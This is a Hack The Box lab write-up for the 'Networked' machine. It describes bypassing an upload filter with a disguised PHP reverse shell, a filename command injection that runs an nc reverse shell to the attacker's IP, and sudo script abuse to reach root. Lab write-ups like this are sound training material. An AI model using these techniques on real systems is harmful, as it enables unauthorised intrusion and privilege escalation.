---
layout: post
title:  Networked
date:   2019-11-16
categories: htb-writeup
---

{:.text-centered}
## NETWORKED@HTB
![Banner](../../../../assets/img/networked/Banner.png){:.image-centered}

Networked is an easy box from hackthebox. Ok let’s start.

### Quick Hack:

__User:__  Port Scan > 80/http > view-source or dirbuster > uploads.php & photos.php > php file upload > reverse shell > user home directory > crontab.guly, check_attack.php > create file in /uploads dir > rev shell as user guly > user.txt

__Root:__  guly > sudo –l > sudo permission for execution of changename.sh without password > run it accordingly > root.txt

### US3R
Run nmap to find open ports. Nmap will show result like this:

![nmap scan](../../../../assets/img/networked/nmap.png){:.image-left}

We have two open ports; 22 is ssh and 80 is http. Open it in browser and there is nothing interesting so let’s view source. 

![upload path](../../../../assets/img/networked/upload.png){:.image-left}

There is a comment about upload and gallery. So, put uploads.php in url and you can find upload page but it says it should be an image file. you can also find photos.php where you can see uploaded files.
[You may not be able to find the uploads.php and photos.php manually so here you can run dirbuster or gobuster to directory brute force:

    gobuster dir –u http://10.10.10.146/ -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt –x php

It will give what you need]
Now you have to find a way how to upload reverse shell. As it is running php download a php reverse shell script from google, edit the IP and port. As it says it should be an image file there should be some filtering which you have to bypass. Change the name of your shell script.

    mv php-reverse-shell.php php-reverse-shell.php.gif 

This isn’t enough you have to add magic byte of GIF file at the begging of the shell, for gif it is GIF89;a

![shell](../../../../assets/img/networked/shell.php.png){:.image-left}

Ok, now set up a netcat listener on the port you set up in script, upload the file and access the photos.php instantly you will get a reverse shell as apache. Go to user home directory, you will find the user flag but you can’t read it as apache. You have to be guly to get it.

![apache](../../../../assets/img/networked/apache.png){:.image-left}

Read crontab.guly and check_attack.php . 

![crontab](../../../../assets/img/networked/crontab.guly.png){:.image-left}

Crontab says there is a cron running for the script check_attack.php. Let’s check this php script.

![php script](../../../../assets/img/networked/check_attack.php.png){:.image-left}

Read it carefully. If you put a file in /var/www/html/uploads directory its name will be value of $value variable. So, if the name of the file is an executable command, it will be executed. This box has netcat installed so let’s try to get a netcat reverse shell. Go to /uploads directory, and create a file

    touch “;nc –c bash <your ip> 443;#”

set an nc listener on port 443 and within a minute you will get a reverse shell as guly.
 
![user flag](../../../../assets/img/networked/user.txt.png){:.image-left}


## R00T
Getting root is easy. Type 

    sudo –l

as guly to see what permission this user has.
 
![sudo path](../../../../assets/img/networked/prevesc_path.png){:.image-left}

guly can run a script as sudo without password. Go to that directory and try to run it as sudo. It asks for some arguments.
 
![hint to root](../../../../assets/img/networked/prevesc_hint.png){:.image-left}

See at the error message. base64 –decode is given as input and it treats –decode as a command, so what you put here after a space is treated as a command.[Read more about this vulnarebility](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclouser&qid=e026a0c5f83df4fd532442e1324ffa4f)

Now try this: Put

    /bin/bash

after a space and you get shell as root. Yup that’s it.
 
![root flag](../../../../assets/img/networked/root.txt.png){:.image-left}

Hope you enjoyed; Happy Hacking.